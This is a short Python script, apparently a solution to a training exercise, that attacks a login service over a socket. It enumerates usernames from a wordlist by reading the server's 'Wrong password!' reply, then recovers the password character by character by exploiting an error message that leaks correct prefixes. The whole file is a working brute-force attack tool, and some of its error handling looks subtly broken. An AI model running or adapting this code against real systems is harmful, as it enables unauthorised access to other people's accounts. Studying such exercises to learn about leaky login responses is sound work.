import sys, socket, itertools, json, string

host, port = sys.argv [1:]


def check_user():
    """
        Find User
    """
    with open("logins.txt") as f:
        user_list = map(lambda elem: elem.strip(), f.readlines())
        for user in user_list:
            client.send(json.dumps({"login": user, "password": ' '}).encode())
            if json.loads(client.recv(1024).decode()) ['result'] == 'Wrong password!':
                return user


def check_password(user=None):
    """
        Find Password
    """
    abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    password = ""

    while True:
        try:
            client.send(json.dumps({"login": user, "password": password}).encode())
            res = client.recv(1024).decode()
            if json.loads(res) ['result'] == "Connection success!":
                print(json.loads(json.dumps(json.dumps(res))))
                break
        except:
            print(json.dumps({"login": user, "password": password}))
            break
        for i in abc:
            try:
                client.send(json.dumps({"login": user, "password": password + i}).encode())
                if json.loads(client.recv(1024).decode())['result'] == 'Exception happened during login':
                    password += i
                    break
            except:
                password += abc[abc.index(i)-1]
                break
with socket.socket() as client:
    client.connect((host, int(port)))
    user = check_user()
    check_password(user=user)